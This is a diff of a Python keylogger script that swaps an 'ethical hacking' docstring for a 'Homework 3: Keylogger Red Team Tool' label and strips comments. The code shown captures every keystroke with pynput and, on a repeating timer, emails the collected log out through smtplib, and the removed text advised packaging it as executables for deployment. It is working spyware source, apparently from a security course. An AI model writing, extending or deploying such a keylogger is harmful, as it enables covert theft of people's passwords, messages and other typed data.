@@ -4,13 +4,8 @@ import smtplib
 import threading
 
 '''
-Description: This tool is part of the Ethical Hacking toolset. This is for educational use ONLY for security purposes.
-The keylogger takes the all key strikes on keyboard and send them to an email every specific period of time
-Requirements: You need only to install pynput
-          		'pip install pynput'
-          		Use packaged executables for Mac OS, Linux and MS Windows for deployment
-Usage: python keylogger.py  or better for deployment to chnage source code and package the app as executables
-Enjoy!
+Homework 3: Keylogger Red Team Tool
+install pynput
 '''
 
 
@@ -32,8 +27,6 @@ class Keylogger:
             # This will not throw exceptions when encountering a special character
             Pressed_key = str(key.char)
         except AttributeError:
-            # The case is for encountering a special character (space, tab, ctrl, Enter etc...)
-            # TODO: include as many if as need to remove unwanted special characters
             if key == key.space:  # Show actual space instead of key.space
                 Pressed_key = " "
             else:
@@ -44,7 +37,6 @@ class Keylogger:
 
     def report(self):
         # print(self.logger)
-        # sending the email of what has been logged
         self.send_mail(self.email, self.password, self.subject, self.logger)
         self.logger = ""
         timer = threading.Timer(self.interval, self.report)
